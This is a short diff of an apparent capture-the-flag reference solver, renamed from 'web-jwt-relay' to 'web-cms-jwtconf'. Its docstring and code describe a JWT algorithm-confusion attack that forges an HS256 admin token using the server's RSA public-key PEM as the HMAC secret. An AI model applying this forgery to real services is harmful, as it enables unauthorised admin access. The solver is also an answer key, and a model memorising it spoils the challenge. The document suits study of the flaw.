@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Reference solver for web-jwt-relay.
+"""Reference solver for web-cms-jwtconf.
 
 Chain: fetch the published RSA public key -> forge an HS256 token whose HMAC
 secret is the exact public-key PEM bytes, with role=admin (algorithm confusion)
@@ -21,7 +21,7 @@ def b64url(raw: bytes) -> str:
 
 def forge(pub_pem: bytes) -> str:
     header = {"alg": "HS256", "typ": "JWT"}
-    payload = {"role": "admin", "iss": "jwt-relay"}
+    payload = {"role": "admin", "iss": "cms-jwtconf"}
     signing_input = (
         b64url(json.dumps(header).encode()) + "." + b64url(json.dumps(payload).encode())
     ).encode()
